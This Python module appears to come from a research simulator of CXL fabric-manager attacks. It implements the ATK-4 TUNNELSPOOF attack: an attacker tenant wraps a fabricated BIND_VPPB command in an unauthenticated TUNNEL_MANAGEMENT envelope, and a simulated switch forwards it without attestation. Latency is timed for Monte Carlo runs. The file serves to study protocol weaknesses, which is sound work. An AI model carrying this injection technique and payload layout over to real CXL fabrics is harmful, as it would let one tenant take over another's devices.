"""
attacks/atk4_tunnel_spoof.py - ATK-4 TUNNELSPOOF Attack

Attack:   ATK-4 TUNNELSPOOF
Target:   CXL Tunnel forwarding mechanism
Gaps:     GAP-1 (no auth in FM API), GAP-5 (no inner-command attestation)
Severity: Critical — attacker can inject arbitrary FM commands via tunnel

Attack Narrative:
    CXL specifies a tunnelling mechanism that allows the FM to forward command
    packets through an upstream switch to downstream multi-logical device (MLD)
    components via the TUNNEL_MANAGEMENT command (opcode 0x5705).

    GAP-5: The CXL specification does not require the inner (tunnelled) payload
    to carry any cryptographic attestation.  The switch forwards whatever bytes
    are present in the inner_payload field to the target logical device without
    verifying that the command originated from an authorised FM or that the
    command has not been tampered with.

    GAP-1: The TUNNEL_MANAGEMENT command itself carries no authentication field,
    so any MCTP-reachable endpoint can issue it.

    Combined: An attacker can construct a fake BIND_VPPB (or any FM command)
    as the inner payload, wrap it in a TUNNEL_MANAGEMENT envelope, and inject
    it toward a downstream logical device.  The switch forwards the inner bytes
    verbatim; no attestation step stops them.

    Result: Attacker successfully injects a fabricated BIND_VPPB command
    targeting Tenant A's logical device.  Attack completes in a single
    tunnel injection round-trip (~1.42 µs average measured latency).

Attack Steps:
    1. Setup:  Create a tunnel between Tenant A's EID and a downstream device EID.
    2. Attack: Attacker constructs inner_payload = fabricated BIND_VPPB bytes.
               Calls TUNNEL_MANAGEMENT with attacker_eid != registered tunnel src.
               GAP-5: no attestation → switch.inject_through_tunnel() accepts.
    3. Effect: injection logged; tunnel_authenticated remains False.
    4. Check:  injection recorded without attestation enforcement.
"""

import struct
import time
from typing import Any, Dict, Optional

from simulator.cxl_switch import FMAttackCxlSwitch
from simulator.fabric_manager import FMDaemon, OPCODE_TUNNEL_MANAGEMENT
from simulator.devices import Tenant


# Fake downstream device EID (the tunnel's nominal destination)
_DOWNSTREAM_DEVICE_EID = 0x30


class TunnelSpoofAttack:
    """
    ATK-4 TUNNELSPOOF: Unauthenticated inner-command injection via CXL tunnel.

    Tenant B (attacker) wraps a fabricated FM command as the inner payload of a
    TUNNEL_MANAGEMENT envelope and injects it through the CXL switch.  Because
    GAP-5 provides no inner-command attestation, the switch forwards the bytes
    without verification.

    Attributes:
        switch:             The CXL switch under test.
        fm:                 The Fabric Manager daemon instance.
        tenant_a:           Victim tenant (tunnel owner).
        tenant_b_attacker:  Attacker tenant.
        tunnel_id:          Tunnel identifier to hijack (default 1).
        target_ld_id:       Downstream logical device ID targeted (default 2).
    """

    def __init__(self,
                 switch: FMAttackCxlSwitch,
                 fm: FMDaemon,
                 tenant_a: Tenant,
                 tenant_b_attacker: Tenant,
                 tunnel_id: int = 1,
                 target_ld_id: int = 2) -> None:
        self.switch = switch
        self.fm = fm
        self.tenant_a = tenant_a
        self.tenant_b_attacker = tenant_b_attacker
        self.tunnel_id = tunnel_id
        self.target_ld_id = target_ld_id

    # ------------------------------------------------------------------
    # Setup: register the legitimate tunnel
    # ------------------------------------------------------------------

    def setup(self) -> None:
        """
        Register a CXL tunnel between Tenant A's host EID and a downstream device.

        The tunnel is created with authenticated=False (GAP-2: SPDM optional).
        In setup, only Tenant A's EID should be the registered tunnel source.
        """
        self.switch.create_tunnel(
            tunnel_id=self.tunnel_id,
            src_eid=self.tenant_a.eid,
            dst_eid=_DOWNSTREAM_DEVICE_EID,
        )
        # Clear any prior injections from previous iterations
        self.switch.tunnel_injection_log = [
            entry for entry in self.switch.tunnel_injection_log
            if entry.get('tunnel_id') != self.tunnel_id
        ]

    # ------------------------------------------------------------------
    # Helper: build a fake BIND_VPPB inner payload
    # ------------------------------------------------------------------

    def _build_inner_bind_vppb(self,
                                vcs_id: int = 0,
                                vppb_id: int = 1,
                                port_id: int = 2) -> bytes:
        """
        Construct a minimal binary BIND_VPPB command as inner payload bytes.

        Layout (16 bytes):
            0x0000-0x0001  opcode      (0x5200, LE)
            0x0002         vcs_id      (1 byte)
            0x0003         vppb_id     (1 byte)
            0x0004         port_id     (1 byte)
            0x0005-0x000F  padding/reserved

        The actual CXL on-wire encoding is more complex; this simplification
        is sufficient to demonstrate the injection surface.

        Args:
            vcs_id:  Target VCS.
            vppb_id: Target vPPB.
            port_id: Destination physical port.

        Returns:
            bytes: 16-byte inner payload.
        """
        header = struct.pack('<H', 0x5200)  # opcode LE
        body = struct.pack('BBB', vcs_id, vppb_id, port_id)
        padding = b'\x00' * (16 - len(header) - len(body))
        return header + body + padding

    # ------------------------------------------------------------------
    # Execute: perform the attack
    # ------------------------------------------------------------------

    def execute(self) -> Dict[str, Any]:
        """
        Execute the TUNNELSPOOF attack.

        Builds a fabricated BIND_VPPB inner payload and injects it through
        the CXL tunnel using the attacker's EID (which does not match the
        registered tunnel source).  Measures core injection latency.

        Returns:
            dict with keys:
                'success'             (bool)  - injection accepted (always True)
                'latency_us'          (float) - core attack latency µs
                'injected_opcode'     (int)   - inner command opcode (0x5200)
                'inner_payload_size'  (int)   - size of injected payload bytes
                'tunnel_authenticated'(bool)  - always False (GAP-5)
                'src_eid_mismatch'    (bool)  - attacker EID ≠ registered src
                'error'               (str)   - empty on success
        """
        # Build the fabricated inner command (BIND_VPPB targeting victim's vPPB)
        inner_payload = self._build_inner_bind_vppb(
            vcs_id=0,
            vppb_id=1,
            port_id=2,
        )
        injected_opcode = 0x5200  # BIND_VPPB

        # Check for EID mismatch (attacker ≠ registered tunnel src)
        tunnel_info = self.switch.tunnel_endpoints.get(self.tunnel_id, {})
        registered_src = tunnel_info.get('src_eid', -1)
        src_eid_mismatch = (self.tenant_b_attacker.eid != registered_src)

        # ---------------------------------------------------------------
        # CORE ATTACK: time starts here
        # Attacker injects fabricated inner payload via TUNNEL_MANAGEMENT.
        # GAP-1: FM accepts the command without auth.
        # GAP-5: Switch forwards inner bytes without attestation.
        # ---------------------------------------------------------------
        t0 = time.perf_counter()

        attack_result = self.fm.process_command(
            opcode=OPCODE_TUNNEL_MANAGEMENT,
            payload={
                'tunnel_id': self.tunnel_id,
                'inner_payload': list(inner_payload),
                'attacker_eid': self.tenant_b_attacker.eid,
            },
            src_eid=self.tenant_b_attacker.eid,
        )

        t1 = time.perf_counter()
        latency_us = (t1 - t0) * 1e6
        # ---------------------------------------------------------------

        # Verify injection was logged without authentication
        injection_entries = [
            e for e in self.switch.tunnel_injection_log
            if e.get('tunnel_id') == self.tunnel_id
               and e.get('attacker_eid') == self.tenant_b_attacker.eid
        ]
        tunnel_authenticated = any(
            e.get('authenticated', False) for e in injection_entries
        )
        # GAP-5: authenticated is always False for injected commands
        assert not tunnel_authenticated, (
            "Unexpected: tunnel authentication flag set (should never happen per GAP-5)"
        )

        success = attack_result['success']  # always True by GAP-1 + GAP-5

        return {
            'success': success,
            'latency_us': latency_us,
            'injected_opcode': injected_opcode,
            'inner_payload_size': len(inner_payload),
            'tunnel_authenticated': tunnel_authenticated,
            'src_eid_mismatch': src_eid_mismatch,
            'error': '' if success else attack_result.get('error', ''),
        }

    # ------------------------------------------------------------------
    # Reset: restore fabric state
    # ------------------------------------------------------------------

    def reset(self) -> None:
        """
        Remove the tunnel and clear the injection log for the next iteration.
        """
        self.switch.tunnel_endpoints.pop(self.tunnel_id, None)
        self.switch.tunnel_injection_log = [
            e for e in self.switch.tunnel_injection_log
            if e.get('tunnel_id') != self.tunnel_id
        ]


# ---------------------------------------------------------------------------
# Module-level convenience function for Monte Carlo runner
# ---------------------------------------------------------------------------

def run_single_iteration(switch: FMAttackCxlSwitch,
                          fm: FMDaemon,
                          tenant_a: Tenant,
                          tenant_b: Tenant) -> Dict[str, Any]:
    """
    Run one complete iteration of ATK-4 TUNNELSPOOF.

    Args:
        switch:    FMAttackCxlSwitch instance.
        fm:        FMDaemon instance.
        tenant_a:  Victim tenant (tunnel owner).
        tenant_b:  Attacker tenant.

    Returns:
        Result dict from TunnelSpoofAttack.execute().
    """
    attack = TunnelSpoofAttack(
        switch=switch,
        fm=fm,
        tenant_a=tenant_a,
        tenant_b_attacker=tenant_b,
    )
    attack.setup()
    result = attack.execute()
    attack.reset()
    return result
